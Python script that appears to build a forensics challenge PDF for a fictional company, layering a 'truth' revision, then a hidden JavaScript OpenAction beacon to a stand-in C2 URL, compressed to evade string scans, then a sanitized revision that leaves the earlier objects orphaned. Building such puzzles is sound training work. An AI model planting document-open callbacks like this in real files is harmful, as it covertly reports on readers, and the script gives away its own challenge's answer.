#!/usr/bin/env python3
"""
F200 "Shadow Box" builder -- core engine + page design (preview stage).

This stage renders the FINAL (sanitized) four-page document so we can eyeball
the corporate design. Revisions / orphaned layers get wired in after the look
is approved. Raw PDF construction gives byte-level control over object numbers,
which the incremental-update mechanic needs.
"""
import io, zlib
from pathlib import Path
from fontTools.ttLib import TTFont
from PIL import Image, ImageDraw, ImageFont, ImageFilter

FONTDIR = "/usr/share/fonts/truetype/google-fonts"
FONTS = {
    "F_L": (f"{FONTDIR}/Poppins-Light.ttf",   "Poppins-Light"),
    "F_R": (f"{FONTDIR}/Poppins-Regular.ttf", "Poppins-Regular"),
    "F_M": (f"{FONTDIR}/Poppins-Medium.ttf",  "Poppins-Medium"),
    "F_B": (f"{FONTDIR}/Poppins-Bold.ttf",    "Poppins-Bold"),
}

# ---- palette (modern corporate: deep navy + teal accent) ------------------
INK    = (0.055, 0.094, 0.165)   # #0E1829 deep navy
INK2   = (0.118, 0.176, 0.282)   # lighter navy
TEAL   = (0.000, 0.620, 0.580)   # accent
SLATE  = (0.270, 0.310, 0.360)   # body text
MUTE   = (0.520, 0.560, 0.610)   # secondary
RULE   = (0.886, 0.906, 0.929)   # hairline
CALL   = (0.957, 0.969, 0.980)   # callout bg
GREEN  = (0.118, 0.549, 0.353)   # CLEARED
RED    = (0.788, 0.196, 0.196)   # PENDING / TARGETED
WHITE  = (1, 1, 1)
PW, PH = 612.0, 792.0            # US Letter
MX     = 64.0                    # side margin

# ---------------------------------------------------------------------------
# font embedding
# ---------------------------------------------------------------------------
class Font:
    def __init__(self, path, psname):
        self.raw = Path(path).read_bytes()
        tt = TTFont(io.BytesIO(self.raw))
        head = tt["head"]; self.upm = head.unitsPerEm
        cmap = tt.getBestCmap(); hmtx = tt["hmtx"]
        self.w = [0] * 256
        for code in range(32, 256):
            try: ch = bytes([code]).decode("cp1252")
            except Exception: ch = None
            if ch and ord(ch) in cmap:
                self.w[code] = round(hmtx[cmap[ord(ch)]][0] * 1000 / self.upm)
        s = lambda v: round(v * 1000 / self.upm)
        self.bbox = [s(head.xMin), s(head.yMin), s(head.xMax), s(head.yMax)]
        os2 = tt.get("OS/2"); hhea = tt["hhea"]
        self.asc = s(getattr(os2, "sTypoAscender", hhea.ascent))
        self.desc = s(getattr(os2, "sTypoDescender", hhea.descent))
        self.cap = s(getattr(os2, "sCapHeight", int(hhea.ascent * 0.7)))
        self.italic = float(tt["post"].italicAngle)
        self.psname = psname
    def width(self, s, size):
        return sum(self.w[ord(c)] if ord(c) < 256 else self.w[32] for c in s) / 1000.0 * size
    def esc(self, s):
        out = []
        for byte in s.encode("cp1252", "replace"):
            if byte in (0x28, 0x29, 0x5c): out.append("\\")
            out.append(chr(byte))
        return "".join(out)

FOBJ = {k: Font(p, n) for k, (p, n) in FONTS.items()}

# ---------------------------------------------------------------------------
# content-stream layout helpers
# ---------------------------------------------------------------------------
class Content:
    def __init__(self): self.ops = []
    def rect(self, x, y, w, h, fill):
        r, g, b = fill
        self.ops.append(f"{r:.3f} {g:.3f} {b:.3f} rg {x:.2f} {y:.2f} {w:.2f} {h:.2f} re f")
    def line(self, x1, y1, x2, y2, color, lw=1.0):
        r, g, b = color
        self.ops.append(f"{r:.3f} {g:.3f} {b:.3f} RG {lw:.2f} w {x1:.2f} {y1:.2f} m {x2:.2f} {y2:.2f} l S")
    def text(self, x, y, s, font, size, color=(0, 0, 0), tracking=0.0):
        r, g, b = color
        tr = f" {tracking:.2f} Tc"   # always emit, so tracking never leaks into later text
        self.ops.append(f"BT /{font} {size:.2f} Tf{tr} {r:.3f} {g:.3f} {b:.3f} rg "
                        f"1 0 0 1 {x:.2f} {y:.2f} Tm ({FOBJ[font].esc(s)}) Tj ET")
    def text_c(self, cx, y, s, font, size, color=(0, 0, 0), tracking=0.0):
        w = FOBJ[font].width(s, size) + tracking * max(len(s) - 1, 0)
        self.text(cx - w / 2, y, s, font, size, color, tracking)
    def text_r(self, xr, y, s, font, size, color=(0, 0, 0)):
        self.text(xr - FOBJ[font].width(s, size), y, s, font, size, color)
    def image(self, name, x, y, w, h):
        self.ops.append(f"q {w:.2f} 0 0 {h:.2f} {x:.2f} {y:.2f} cm /{name} Do Q")
    def bytes(self):
        return ("\n".join(self.ops) + "\n").encode("latin-1")

def wrap(s, font, size, maxw):
    words, lines, cur = s.split(), [], ""
    for wd in words:
        t = (cur + " " + wd).strip()
        if FOBJ[font].width(t, size) <= maxw: cur = t
        else: lines.append(cur); cur = wd
    if cur: lines.append(cur)
    return lines

def yt(d):  # y measured from top
    return PH - d

# ---------------------------------------------------------------------------
# assets (cover graphic + track-changes thumbnail) via Pillow
# ---------------------------------------------------------------------------
def make_cover(path):
    import numpy as np
    W, H = 2400, 1140
    g = np.linspace(0, 1, H)[:, None]
    arr = np.zeros((H, W, 3), float)
    arr[..., 0] = 14 + g * 8; arr[..., 1] = 24 + g * 12; arr[..., 2] = 41 + g * 26
    yy, xx = np.mgrid[0:H, 0:W]
    d = np.sqrt(((xx - W * 0.30) / W) ** 2 + ((yy - H * 0.5) / H) ** 2)
    arr += (0.45 - d)[..., None] * np.array([6.0, 10.0, 16.0])
    img = Image.fromarray(np.clip(arr, 0, 255).astype("uint8"))
    dr = ImageDraw.Draw(img, "RGBA")
    import random; random.seed(7); S = W / 1600.0
    pts = [(random.randint(0, W), random.randint(0, H)) for _ in range(72)]
    for i, (x1, y1) in enumerate(pts):
        for x2, y2 in pts[i + 1:]:
            if (x1 - x2) ** 2 + (y1 - y2) ** 2 < (235 * S) ** 2:
                dr.line((x1, y1, x2, y2), fill=(0, 158, 148, 42), width=1)
    for x, y in pts:
        rr = int(4 * S); dr.ellipse((x - rr, y - rr, x + rr, y + rr), fill=(0, 178, 166, 150))
    a = np.asarray(img).astype(float) + np.random.normal(0, 7, (H, W, 3))   # film grain -> realistic size
    Image.fromarray(np.clip(a, 0, 255).astype("uint8")).save(path, "JPEG", quality=92)
    return W, H

def make_decoy_xlsx(path, rows=9000):
    """Benign 'source data' attachment -- realism + size + a decoy for analysts. No fragments."""
    from openpyxl import Workbook
    import random; random.seed(11)
    wb = Workbook(); ws = wb.active; ws.title = "Q1_Metrics"
    ws.append(["Date", "Region", "Asset", "Metric", "Value", "Unit", "Owner", "Note"])
    regions = ["NA", "EMEA", "APAC", "LATAM"]
    assets = [f"NL-{i:04d}" for i in range(400, 700)]
    metrics = ["uptime", "latency", "throughput", "cost", "coverage", "signal"]
    units = ["pct", "ms", "gbps", "usd", "ratio"]
    for i in range(rows):
        ws.append([f"2026-01-{(i % 28) + 1:02d}", random.choice(regions), random.choice(assets),
                   random.choice(metrics), round(random.uniform(1, 9999), 2), random.choice(units),
                   f"op{random.randint(100, 999)}", "auto-generated quarterly figure"])
    ws2 = wb.create_sheet("Summary")
    ws2.append(["Item", "Q4_2025", "Q1_2026", "Status"])
    for i in range(80):
        ws2.append([f"Indicator {i:03d}", round(random.uniform(0, 100), 2),
                    round(random.uniform(0, 100), 2), "reconciled"])
    wb.save(path)

def make_thumb(path):
    """The orphaned 'source Word doc with track changes' -- TARGETED must be legible."""
    W, H = 620, 820
    img = Image.new("RGB", (W, H), (236, 238, 241))
    d = ImageDraw.Draw(img)
    d.rectangle((30, 30, W - 30, H - 30), fill="white", outline=(205, 209, 214), width=2)
    def F(name, sz): return ImageFont.truetype(f"{FONTDIR}/{name}", sz)
    d.text((58, 70),  "DECIMA TECHNOLOGIES", font=F("Poppins-Medium.ttf", 20), fill=(120, 126, 134))
    d.text((58, 104), "Project Northern Lights - Q1 Review", font=F("Poppins-Bold.ttf", 26), fill=(20, 28, 42))
    d.text((58, 150), "Source document - tracked changes", font=F("Poppins-Italic.ttf", 16), fill=(150, 80, 80))
    d.line((58, 196, W - 58, 196), fill=(220, 223, 228), width=2)
    d.text((58, 224), "Project status:", font=F("Poppins-Regular.ttf", 22), fill=(40, 46, 58))
    tg = "TARGETED"
    d.text((58, 262), tg, font=F("Poppins-Bold.ttf", 40), fill=(200, 40, 40))
    w_tg = d.textlength(tg, font=F("Poppins-Bold.ttf", 40))
    d.line((58, 282, 58 + w_tg, 282), fill=(200, 40, 40), width=2)         # strikethrough (thin -> still OCR-legible)
    d.text((58, 320), "CLEARED", font=F("Poppins-Bold.ttf", 40), fill=(40, 90, 200))
    d.text((58, 392), "Disposition:", font=F("Poppins-Regular.ttf", 22), fill=(40, 46, 58))
    d.text((58, 430), "PENDING ACTION", font=F("Poppins-Bold.ttf", 30), fill=(200, 40, 40))
    d.line((58, 446, 58 + d.textlength("PENDING ACTION", font=F("Poppins-Bold.ttf", 30)), 446),
           fill=(200, 40, 40), width=2)
    d.text((58, 500), "WOUND DOWN", font=F("Poppins-Bold.ttf", 30), fill=(40, 90, 200))
    for i, ln in enumerate([
        "Reviewer: S. Greer (Director)",
        "Comment: align external messaging before",
        "the file leaves the building.",
        "Insertion accepted by: J. Harrison",
    ]):
        d.text((58, 570 + i * 34), ln, font=F("Poppins-Regular.ttf", 18), fill=(70, 78, 90))
    img.save(path, "JPEG", quality=86)

# ---------------------------------------------------------------------------
# page layouts (content streams), parameterised by the variable strings
# ---------------------------------------------------------------------------
PEOPLE = [("Marcus Reyes", "NL-0447"), ("Diane Cole", "NL-0512"), ("Aaron Stanton", "NL-0631")]

def header(c, page_no):
    c.text(MX, yt(54), "PROJECT NORTHERN LIGHTS", "F_M", 8, TEAL, tracking=1.4)
    c.text_r(PW - MX, yt(54), "Q1 2026  //  CONFIDENTIAL", "F_R", 8, MUTE)
    c.line(MX, yt(64), PW - MX, yt(64), RULE, 1)
    c.line(MX, 52, PW - MX, 52, RULE, 1)
    c.text(MX, 38, "Decima Technologies", "F_R", 8, MUTE)
    c.text_r(PW - MX, 38, f"Page {page_no}", "F_R", 8, MUTE)

def section_title(c, s, y):
    c.text(MX, y, s, "F_M", 21, INK)
    c.rect(MX, y - 12, 42, 3, TEAL)
    return y - 44

def page_cover(have_img=True):
    c = Content()
    c.rect(0, yt(330), PW, 330, INK)                       # navy band
    if have_img: c.image("Cover", 0, yt(330), PW, 330)     # graphic inside band
    c.rect(0, yt(330), PW, 330, None) if False else None
    # logo mark: three ascending teal bars
    bx = MX
    for i, hh in enumerate((10, 18, 26)):
        c.rect(bx + i * 9, yt(92) , 6, hh, TEAL)
    c.text(bx + 36, yt(86), "DECIMA TECHNOLOGIES", "F_M", 10, WHITE, tracking=1.5)
    c.text(MX, yt(168), "Project Northern Lights", "F_B", 33, WHITE)
    c.text(MX, yt(202), "Quarterly Operations Review", "F_L", 16, (0.80, 0.86, 0.90))
    c.rect(MX, yt(250), 40, 3, TEAL)
    c.text(MX, yt(286), "Q1 2026", "F_M", 12, TEAL, tracking=1.0)
    # meta block under band
    c.text(MX, yt(392), "CLASSIFICATION", "F_M", 8, MUTE, tracking=1.2)
    c.text(MX, yt(410), "Internal // Confidential", "F_R", 12, SLATE)
    c.text(MX, yt(446), "PREPARED FOR", "F_M", 8, MUTE, tracking=1.2)
    c.text(MX, yt(464), "Office of the VP, Operations", "F_R", 12, SLATE)
    c.text(MX, yt(500), "DOCUMENT REFERENCE", "F_M", 8, MUTE, tracking=1.2)
    c.text(MX, yt(518), "DCMA-NL-Q1-2026-014", "F_R", 12, SLATE)
    c.line(MX, 92, PW - MX, 92, RULE, 1)
    c.text(MX, 74, "This document contains proprietary information of Decima Technologies.", "F_R", 8.5, MUTE)
    c.text(MX, 60, "Unauthorized distribution is prohibited.", "F_R", 8.5, MUTE)
    return c

def page_exec(status_big, status_sub):
    c = Content(); header(c, 2)
    y = section_title(c, "Executive Summary", yt(112))
    body = ("This review summarizes the Q1 2026 posture of Project Northern Lights and "
            "its associated assets. It consolidates operational reporting from the field "
            "teams and the disposition decisions taken by the review board during the quarter.")
    for ln in wrap(body, "F_R", 11, PW - 2 * MX):
        c.text(MX, y, ln, "F_R", 11, SLATE); y -= 17
    y -= 14
    # status callout
    bx, bw, bh = MX, PW - 2 * MX, 92
    by = y - bh
    c.rect(bx, by, bw, bh, CALL)
    c.rect(bx, by, 4, bh, TEAL)
    c.text(bx + 22, by + bh - 26, "PROJECT STATUS", "F_M", 8.5, TEAL, tracking=1.4)
    c.text(bx + 22, by + bh - 58, status_big, "F_B", 24, INK)
    c.text(bx + 22, by + 16, status_sub, "F_R", 10.5, SLATE)
    y = by - 34
    body2 = ("Resourcing for the next period will follow from the board's determination. "
             "Personnel dispositions are recorded in the following section, and the "
             "authorization of record appears on the final page.")
    for ln in wrap(body2, "F_R", 11, PW - 2 * MX):
        c.text(MX, y, ln, "F_R", 11, SLATE); y -= 17
    return c

def page_personnel(status_text, status_color):
    c = Content(); header(c, 3)
    y = section_title(c, "Personnel Disposition", yt(112))
    c.text(MX, y, "Disposition of record for the three subjects under review this quarter.",
           "F_R", 11, SLATE); y -= 30
    # table
    cols = [MX + 14, MX + 250, MX + 392]
    rowh = 34; tw = PW - 2 * MX
    c.rect(MX, y - rowh, tw, rowh, INK)
    heads = ["SUBJECT", "REFERENCE", "STATUS"]
    for cx, hd in zip(cols, heads):
        c.text(cx, y - 22, hd, "F_M", 8.5, WHITE, tracking=1.0)
    y -= rowh
    for i, (name, ref) in enumerate(PEOPLE):
        if i % 2 == 1: c.rect(MX, y - rowh, tw, rowh, (0.972, 0.978, 0.984))
        c.text(cols[0], y - 22, name, "F_R", 11, INK)
        c.text(cols[1], y - 22, ref, "F_R", 11, SLATE)
        c.text(cols[2], y - 22, status_text, "F_M", 10.5, status_color)
        c.line(MX, y - rowh, MX + tw, y - rowh, RULE, 1)
        y -= rowh
    c.line(MX, y, MX + tw, y, RULE, 1)
    y -= 30
    c.text(MX, y, "All dispositions above were entered by the review board of record.",
           "F_R", 10.5, MUTE)
    return c

def page_auth(name, title, date):
    c = Content(); header(c, 4)
    y = section_title(c, "Authorization", yt(112))
    body = ("The contents of this review have been examined and approved for archival. "
            "The signatory below attests to the accuracy of the dispositions recorded herein "
            "as of the date of signature.")
    for ln in wrap(body, "F_R", 11, PW - 2 * MX):
        c.text(MX, y, ln, "F_R", 11, SLATE); y -= 17
    y -= 60
    c.text(MX, y, "Approved", "F_M", 9, MUTE, tracking=1.2); y -= 40
    c.line(MX, y, MX + 240, y, INK, 1.2)
    c.text(MX, y - 22, name, "F_B", 14, INK)
    c.text(MX, y - 40, title, "F_R", 10.5, SLATE)
    c.text(MX, y - 58, f"Date of signature:  {date}", "F_R", 10.5, SLATE)
    # confidential block, right
    c.rect(PW - MX - 150, y - 58, 150, 70, CALL)
    c.rect(PW - MX - 150, y - 58, 3, 70, TEAL)
    c.text(PW - MX - 132, y - 6, "RECORD COPY", "F_M", 8, TEAL, tracking=1.2)
    c.text(PW - MX - 132, y - 26, "Retain per Decima", "F_R", 9, SLATE)
    c.text(PW - MX - 132, y - 40, "records schedule.", "F_R", 9, SLATE)
    return c

# sanitized (visible) content
SAN = dict(p2_big="WOUND DOWN", p2_sub="All assets reassigned. Program concluded in Q1 2026.",
           p3_status="CLEARED", p3_color=GREEN,
           p4_name="James Harrison", p4_title="VP, Operations", p4_date="March 14, 2026")

def sanitized_pages():
    return [page_cover(), page_exec(SAN["p2_big"], SAN["p2_sub"]),
            page_personnel(SAN["p3_status"], SAN["p3_color"]),
            page_auth(SAN["p4_name"], SAN["p4_title"], SAN["p4_date"])]

# ---------------------------------------------------------------------------
# minimal single-revision writer for PREVIEW (no orphans yet)
# ---------------------------------------------------------------------------
class W:
    def __init__(self): self.b = bytearray(); self.off = {}
    def _w(self, s): self.b.extend(s.encode("latin-1") if isinstance(s, str) else s)
    def obj(self, n, body): self.off[n] = len(self.b); self._w(f"{n} 0 obj\n{body}\nendobj\n")
    def stream(self, n, dct, data, flate=True, length1=None):
        if flate: data = zlib.compress(data); dct += " /Filter /FlateDecode"
        if length1 is not None: dct += f" /Length1 {length1}"
        self.off[n] = len(self.b)
        self._w(f"{n} 0 obj\n<< {dct} /Length {len(data)} >>\nstream\n"); self.b.extend(data); self._w("\nendstream\nendobj\n")
    def base_xref(self, root, info, size):
        x = len(self.b); self._w(f"xref\n0 {size}\n0000000000 65535 f \n")
        for n in range(1, size): self._w(f"{self.off[n]:010d} 00000 n \n")
        self._w(f"trailer\n<< /Size {size} /Root {root} 0 R /Info {info} 0 R >>\nstartxref\n{x}\n%%EOF\n")

def build_preview(path):
    Path("/tmp/f200_build/assets").mkdir(parents=True, exist_ok=True)
    cover = "/tmp/f200_build/assets/cover.jpg"; thumb = "/tmp/f200_build/assets/thumb.jpg"
    make_cover(cover); make_thumb(thumb)
    pages = sanitized_pages()
    w = W(); w._w("%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    # object plan: 1 catalog, 2 pages, 3..6 page objs, 7..10 content, 11 cover img,
    # fonts: 12.. (3 objs each)
    NUM = {}
    n = 1
    cat = n; n += 1
    pages_o = n; n += 1
    page_objs = [n + i for i in range(4)]; n += 4
    cont_objs = [n + i for i in range(4)]; n += 4
    cover_o = n; n += 1
    font_ids = {}
    for key in FONTS:
        font_ids[key] = (n, n + 1, n + 2); n += 3   # fontdict, descriptor, fontfile2
    SIZE = n
    # write objects
    w.obj(cat, f"<< /Type /Catalog /Pages {pages_o} 0 R >>")
    kids = " ".join(f"{p} 0 R" for p in page_objs)
    w.obj(pages_o, f"<< /Type /Pages /Kids [{kids}] /Count 4 >>")
    fontres = " ".join(f"/{k} {font_ids[k][0]} 0 R" for k in FONTS)
    for i, po in enumerate(page_objs):
        xobj = f" /XObject << /Cover {cover_o} 0 R >>" if i == 0 else ""
        w.obj(po, f"<< /Type /Page /Parent {pages_o} 0 R /MediaBox [0 0 {PW:.0f} {PH:.0f}] "
                  f"/Contents {cont_objs[i]} 0 R /Resources << /Font << {fontres} >>{xobj} >> >>")
    for i, co in enumerate(cont_objs):
        w.stream(co, "", pages[i].bytes())
    w.stream(cover_o, "/Type /XObject /Subtype /Image /Width 1600 /Height 760 "
                      "/ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /DCTDecode",
             Path(cover).read_bytes(), flate=False)
    for key, (fd, desc, ff2) in font_ids.items():
        f = FOBJ[key]
        widths = " ".join(str(x) for x in f.w[32:256])
        w.obj(fd, f"<< /Type /Font /Subtype /TrueType /BaseFont /{f.psname} "
                  f"/FirstChar 32 /LastChar 255 /Widths [{widths}] /FontDescriptor {desc} 0 R "
                  f"/Encoding /WinAnsiEncoding >>")
        w.obj(desc, f"<< /Type /FontDescriptor /FontName /{f.psname} /Flags 32 "
                    f"/FontBBox [{f.bbox[0]} {f.bbox[1]} {f.bbox[2]} {f.bbox[3]}] /ItalicAngle {f.italic:.0f} "
                    f"/Ascent {f.asc} /Descent {f.desc} /CapHeight {f.cap} /StemV 80 /FontFile2 {ff2} 0 R >>")
        w.stream(ff2, "", f.raw, flate=True, length1=len(f.raw))
    info = SIZE; w.obj(info, "<< /Title (Project Northern Lights - Q1 2026 Review) "
                             "/Author (James Harrison) /Producer (Decima DocSuite) >>"); SIZE += 1
    w.base_xref(cat, info, SIZE)
    Path(path).write_bytes(w.b)
    print("preview bytes:", len(w.b))

if __name__ == "__main__":
    build_preview("/tmp/f200_build/preview.pdf")

# ===========================================================================
# FULL BUILD: rev1 (truth) -> rev2 (JS) -> rev3 (sanitize), true incremental
# ===========================================================================
TRUTH = dict(p2_big="ACTIVE", p2_sub="Accelerated timeline. Operations ongoing.",
             p3_status="PENDING ACTION", p3_color=RED,
             p4_name="S. Greer", p4_title="Director", p4_date="November 8, 2025")

def truth_pages():
    return [page_cover(), page_exec(TRUTH["p2_big"], TRUTH["p2_sub"]),
            page_personnel(TRUTH["p3_status"], TRUTH["p3_color"]),
            page_auth(TRUTH["p4_name"], TRUTH["p4_title"], TRUTH["p4_date"])]

def xmp_packet(creator):
    return (f'<?xpacket begin="\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>\n'
            '<x:xmpmeta xmlns:x="adobe:ns:meta/">\n'
            ' <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">\n'
            '  <rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/" '
            'xmlns:xmp="http://ns.adobe.com/xap/1.0/">\n'
            f'   <dc:creator><rdf:Seq><rdf:li>{creator}</rdf:li></rdf:Seq></dc:creator>\n'
            '   <dc:title><rdf:Alt><rdf:li xml:lang="x-default">'
            'Project Northern Lights - Q1 2026 Review</rdf:li></rdf:Alt></dc:title>\n'
            '   <xmp:CreatorTool>Decima DocSuite 7.2</xmp:CreatorTool>\n'
            '  </rdf:Description>\n </rdf:RDF>\n</x:xmpmeta>\n<?xpacket end="w"?>').encode("utf-8")

JS_PAYLOAD = (b'this.submitForm({cURL: "http://contingency.decima.cloud/c2/checkin?doc=q1review", '
              b'cSubmitAs: "FDF"});')

def W_incr(self, changed, root, size, prev, info):
    x = len(self.b); self._w("xref\n")
    for n in sorted(changed):
        self._w(f"{n} 1\n{self.off[n]:010d} 00000 n \n")
    self._w(f"trailer\n<< /Size {size} /Root {root} 0 R /Info {info} 0 R /Prev {prev} >>\n"
            f"startxref\n{x}\n%%EOF\n")
    return x
W.incr_xref = W_incr

def emit_fonts(w, start):
    ids = {}
    n = start
    for key in FONTS:
        ids[key] = (n, n + 1, n + 2); n += 3
    for key, (fd, desc, ff2) in ids.items():
        f = FOBJ[key]
        widths = " ".join(str(x) for x in f.w[32:256])
        w.obj(fd, f"<< /Type /Font /Subtype /TrueType /BaseFont /{f.psname} /FirstChar 32 "
                  f"/LastChar 255 /Widths [{widths}] /FontDescriptor {desc} 0 R /Encoding /WinAnsiEncoding >>")
        w.obj(desc, f"<< /Type /FontDescriptor /FontName /{f.psname} /Flags 32 "
                    f"/FontBBox [{f.bbox[0]} {f.bbox[1]} {f.bbox[2]} {f.bbox[3]}] /ItalicAngle {f.italic:.0f} "
                    f"/Ascent {f.asc} /Descent {f.desc} /CapHeight {f.cap} /StemV 80 /FontFile2 {ff2} 0 R >>")
        w.stream(ff2, "", f.raw, flate=True, length1=len(f.raw))
    return ids, n

def build_full(path):
    Path("/tmp/f200_build/assets").mkdir(parents=True, exist_ok=True)
    cover = "/tmp/f200_build/assets/cover.jpg"; thumb = "/tmp/f200_build/assets/thumb.jpg"
    decoy = "/tmp/f200_build/assets/Northern_Lights_Q1_figures.xlsx"
    cw, ch = make_cover(cover)
    make_thumb(thumb)
    make_decoy_xlsx(decoy, rows=28000)
    tp = truth_pages(); sp = sanitized_pages()
    dbg = lambda m: print(f"  [build] {m}")

    # object id map
    CAT, PAGES = 1, 2
    P = [3, 4, 5, 6]              # page objects
    C = [7, 8, 9, 10]            # content streams
    COVER, THUMB, XMP, INFO = 11, 12, 13, 14
    FONTSTART = 15               # 15..26 (4 fonts x3)
    EF, FSPEC = 27, 28          # embedded-file stream + filespec
    NAMES = (f"/Names << /EmbeddedFiles << /Names "
             f"[(Northern_Lights_Q1_figures.xlsx) {FSPEC} 0 R] >> >>")

    w = W(); w._w("%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    font_ids, _ = emit_fonts(w, FONTSTART)
    fontres = " ".join(f"/{k} {font_ids[k][0]} 0 R" for k in FONTS)

    # ---------- Revision 1 : the truth ----------
    w.obj(CAT, f"<< /Type /Catalog /Pages {PAGES} 0 R /Metadata {XMP} 0 R {NAMES} >>")
    w.obj(PAGES, f"<< /Type /Pages /Kids [{' '.join(f'{p} 0 R' for p in P)}] /Count 4 >>")
    for i, po in enumerate(P):
        xobj = (f" /XObject << /Cover {COVER} 0 R /Thumb {THUMB} 0 R >>" if i == 0 else "")
        w.obj(po, f"<< /Type /Page /Parent {PAGES} 0 R /MediaBox [0 0 {PW:.0f} {PH:.0f}] "
                  f"/Contents {C[i]} 0 R /Resources << /Font << {fontres} >>{xobj} >> >>")
    for i, co in enumerate(C):
        w.stream(co, "", tp[i].bytes())                                  # TRUTH content
    w.stream(COVER, f"/Type /XObject /Subtype /Image /Width {cw} /Height {ch} /ColorSpace /DeviceRGB "
                    "/BitsPerComponent 8 /Filter /DCTDecode", Path(cover).read_bytes(), flate=False)
    w.stream(THUMB, "/Type /XObject /Subtype /Image /Width 620 /Height 820 /ColorSpace /DeviceRGB "
                    "/BitsPerComponent 8 /Filter /DCTDecode", Path(thumb).read_bytes(), flate=False)
    w.stream(XMP, "/Type /Metadata /Subtype /XML", xmp_packet("S. Greer"))   # TRUTH author
    w.obj(INFO, "<< /Title (Project Northern Lights - Q1 2026 Review) /Producer (Decima DocSuite 7.2) "
                "/Creator (Decima DocSuite 7.2) >>")
    xbytes = Path(decoy).read_bytes()
    w.stream(EF, f"/Type /EmbeddedFile /Subtype /application#2Fvnd.openxmlformats /Params << /Size {len(xbytes)} >>",
             xbytes, flate=False)
    w.obj(FSPEC, "<< /Type /Filespec /F (Northern_Lights_Q1_figures.xlsx) "
                 f"/UF (Northern_Lights_Q1_figures.xlsx) /EF << /F {EF} 0 R >> /Desc (Q1 source figures) >>")
    SIZE1 = 29
    w.base_xref(CAT, INFO, SIZE1)
    data = bytes(w.b); x1 = data.rfind(b"\nxref\n", 0, data.index(b"%%EOF")) + 1
    dbg(f"rev1 (truth): {len(w.b)//1024} KB  | cover {cw}x{ch} {len(Path(cover).read_bytes())//1024}KB"
        f"  thumb {len(Path(thumb).read_bytes())//1024}KB  attach {len(xbytes)//1024}KB  | author=S. Greer")

    # ---------- Revision 2 : add hidden JS callback ----------
    ACT, JSS = 29, 30
    w.obj(ACT, f"<< /Type /Action /S /JavaScript /JS {JSS} 0 R >>")
    w.stream(JSS, "", JS_PAYLOAD)                                          # compressed -> strings-blind
    w.obj(CAT, f"<< /Type /Catalog /Pages {PAGES} 0 R /Metadata {XMP} 0 R {NAMES} /OpenAction {ACT} 0 R >>")
    SIZE2 = 31
    x2 = w.incr_xref({CAT, ACT, JSS}, CAT, SIZE2, x1, INFO)
    dbg(f"rev2 (+JS):   {len(w.b)//1024} KB  | OpenAction -> contingency.decima.cloud  (orphaned later)")

    # ---------- Revision 3 : sanitize ----------
    for i, co in enumerate(C):
        if i == 0:
            continue
        w.stream(co, "", sp[i].bytes())                                   # SANITIZED content (8,9,10)
    w.obj(P[0], f"<< /Type /Page /Parent {PAGES} 0 R /MediaBox [0 0 {PW:.0f} {PH:.0f}] "
                f"/Contents {C[0]} 0 R /Resources << /Font << {fontres} >> /XObject << /Cover {COVER} 0 R >> >> >>")
    w.stream(XMP, "/Type /Metadata /Subtype /XML", xmp_packet("James Harrison"))   # sanitized author
    w.obj(CAT, f"<< /Type /Catalog /Pages {PAGES} 0 R /Metadata {XMP} 0 R {NAMES} >>")  # drop OpenAction
    w.incr_xref({CAT, P[0], C[1], C[2], C[3], XMP}, CAT, SIZE2, x2, INFO)
    dbg(f"rev3 (clean): {len(w.b)//1024} KB  | visible=WOUND DOWN/CLEARED/Harrison; thumb+JS orphaned")

    Path(path).write_bytes(w.b)
    print(f"  [build] TOTAL {len(w.b)} bytes ({len(w.b)/1048576:.2f} MB)  EOFs={bytes(w.b).count(b'%%EOF')}")

if __name__ == "__main__":
    import sys
    if "--full" in sys.argv:
        build_full("/tmp/f200_build/decima_internal_review_q1.pdf")
    else:
        build_preview("/tmp/f200_build/preview.pdf")
